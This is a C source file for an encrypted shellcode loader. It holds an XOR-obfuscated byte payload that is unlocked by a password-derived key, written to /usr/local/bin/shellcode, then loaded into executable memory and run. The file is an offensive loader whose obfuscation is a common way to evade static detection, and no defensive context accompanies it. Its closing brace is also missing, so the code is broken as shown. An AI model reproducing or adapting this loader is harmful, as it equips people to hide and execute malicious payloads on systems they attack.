#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <termios.h>

#define SHELLCODE_FILENAME "/usr/local/bin/shellcode" 

// XOR Decryption Function
void xor_encrypt_decrypt(unsigned char *data, size_t length, unsigned char key) {
    for (size_t i = 0; i < length; i++) {
        data[i] ^= key;
    }
}

// Encrypted shellcode in hex format
unsigned char encrypted_shellcode[] = {
    0xd8, 0x2f, 0x47, 0x67, 0x27, 0x67, 0x67, 0x67, 0x67, 0x56, 0x2f, 0x2f, 0x91, 0xb5, 0x56,
    0x5c, 0xdf, 0x67, 0x67, 0x68, 0x67, 0x2f, 0x62, 0x98, 0x56, 0x5b, 0xdf, 0x67, 0x67, 0x68,
    0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67,
    0x67, 0x67, 0x67, 0x67, 0x05, 0x48, 0x09, 0x0e, 0x14, 0x48, 0x67, 0x0f, 0x49, 0x67, 0x0f,
    0x14, 0x13, 0x14, 0x13, 0x15, 0x05, 0x06, 0x49, 0x67, 0x02, 0x13, 0x13, 0x1f, 0x49, 0x67,
    0x06, 0x03, 0x06, 0x13, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67
};

// Length of the encrypted shellcode
#define ENCRYPTED_SHELLCODE_LENGTH sizeof(encrypted_shellcode)

void get_password(char *password, size_t max_length) {
    struct termios oldt, newt;
    
    // Get the current terminal settings
    tcgetattr(STDIN_FILENO, &oldt);
    newt = oldt;
    
    // Disable echoing
    newt.c_lflag &= ~(ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);
    
    // Read the password
    printf("Enter password: ");
    if (fgets(password, max_length, stdin) == NULL) {
        perror("fgets");
        exit(EXIT_FAILURE);
    }
    
    // Restore terminal settings
    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
    
    // Remove newline character from password if present
    size_t len = strlen(password);
    if (len > 0 && password[len - 1] == '\n') {
        password[len - 1] = '\0';
    }
}

// Function to write shellcode to a file
int write_shellcode_to_file(const char *filename, unsigned char *shellcode, size_t length) {
    FILE *file = fopen(filename, "wb");
    if (!file) {
        perror("fopen");
        return -1;
    }

    if (fwrite(shellcode, 1, length, file) != length) {
        perror("fwrite");
        fclose(file);
        return -1;
    }

    fclose(file);
    return 0;
}

// Function to execute shellcode
int execute_shellcode(unsigned char *shellcode, size_t length) {
    // Allocate memory for shellcode
    void *exec_memory = mmap(NULL, length, PROT_READ | PROT_WRITE | PROT_EXEC,
                             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec_memory == MAP_FAILED) {
        perror("mmap");
        return -1;
    }

    // Copy shellcode into allocated memory
    memcpy(exec_memory, shellcode, length);

    // Cast and execute the shellcode
    void (*func)() = (void (*)())exec_memory;
    func();

    // Clean up
    munmap(exec_memory, length);
    return 0;
}

int main() {
    unsigned char key;
    char password[256];

    // Ask for the password
    get_password(password,sizeof(password));
/*    printf("Enter the password: ");
    if (fgets(password, sizeof(password), stdin) == NULL) {
        perror("fgets");
        return EXIT_FAILURE;
    }

    // Remove newline character from password
    size_t len = strlen(password);
    if (len > 0 && password[len - 1] == '\n') {
        password[len - 1] = '\0';
    }
*/
    // Simple password-to-key conversion (e.g., use the first byte of the password as the key)
    key = (unsigned char)password[0];  // For simplicity, use the first character of the password as the key

    // Decrypt the shellcode
    unsigned char shellcode[ENCRYPTED_SHELLCODE_LENGTH];
    memcpy(shellcode, encrypted_shellcode, ENCRYPTED_SHELLCODE_LENGTH);
    xor_encrypt_decrypt(shellcode, ENCRYPTED_SHELLCODE_LENGTH, key);

    // Optionally print the decrypted shellcode for verification
    printf("Decrypted shellcode:\n");
    for (size_t i = 0; i < ENCRYPTED_SHELLCODE_LENGTH; i++) {
        printf("%02x ", shellcode[i]);
    }
    printf("\n");

    //Write the decrypted shellcode to a file
    if (write_shellcode_to_file(SHELLCODE_FILENAME, shellcode, ENCRYPTED_SHELLCODE_LENGTH) != 0) {
        fprintf(stderr, "Failed to write shellcode to file\n");
        return EXIT_FAILURE;
    }

    // Execute the shellcode from the file
    unsigned char *read_shellcode;
    size_t shellcode_length;

    FILE *file = fopen(SHELLCODE_FILENAME, "rb");
    if (!file) {
        perror("fopen");
        return EXIT_FAILURE;
    }

    fseek(file, 0, SEEK_END);
    shellcode_length = ftell(file);
    fseek(file, 0, SEEK_SET);

    read_shellcode = malloc(shellcode_length);
    if (!read_shellcode) {
        perror("malloc");
        fclose(file);
        return EXIT_FAILURE;
    }

    if (fread(read_shellcode, 1, shellcode_length, file) != shellcode_length) {
        perror("fread");
        free(read_shellcode);
        fclose(file);
        return EXIT_FAILURE;
    }

    fclose(file);

    write_shellcode_to_file(SHELLCODE_FILENAME, shellcode, sizeof(shellcode));
    if (execute_shellcode(read_shellcode, shellcode_length) != 0) {
        fprintf(stderr, "Failed to execute shellcode from file\n");
        free(read_shellcode);
        return EXIT_FAILURE;
    } else {
		printf("Sucessfull execution from file.");

    free(read_shellcode);
    return EXIT_SUCCESS;
}
